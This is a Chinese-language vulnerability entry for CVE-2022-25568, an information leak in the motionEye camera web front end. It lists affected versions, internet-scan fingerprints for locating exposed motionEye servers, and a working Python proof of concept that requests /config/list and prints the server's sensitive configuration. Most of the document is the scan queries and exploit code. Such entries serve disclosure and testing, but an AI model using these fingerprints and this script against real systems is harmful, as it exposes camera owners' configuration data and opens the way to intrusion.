# MotionEye 视频监控组件 list 信息泄漏洞 CVE-2022-25568

## 漏洞描述

*motionEye*是用 Python 写的 motion 的 Web 前端，它可以监视视频信号并检测运动。它可以与多种类型的摄像机配合使用,也可以与电影文件一起使用,从而使您可以分析录制的视频，其中存在一个信息泄漏漏洞，通过构造特定的 URL 即可获取服务器敏感信息

## 漏洞影响

```
MotionEye <= v0.42.1
```

## 网络测绘

```
banner="motionEye"

app="motionEye"
app="motionEye-摄像头服务器"
app="motionEye/0.39.3"
app="motionEye/0.40"
app="motionEye01"
app="motionEye/0.33"
app="motionEye/0.35"
```

## 漏洞复现

通过查看响应 Server 判断是否使用，访问路由 `/config/list`

## 漏洞 POC

```python
import sys
import json
import requests
def exp(url):
    if url[-1] == "/":
        url = url + "config/list"
    else:
        url = url + "/config/list"
    rus = requests.get(url, verify=False)
    print("信息泄露内容:")
    print(json.dumps(json.loads(rus.text), sort_keys=True, indent=4))
if __name__ == '__main__':
    ip = sys.argv[1]
    print("访问IP:{0}".format(ip))
    exp(ip)
```
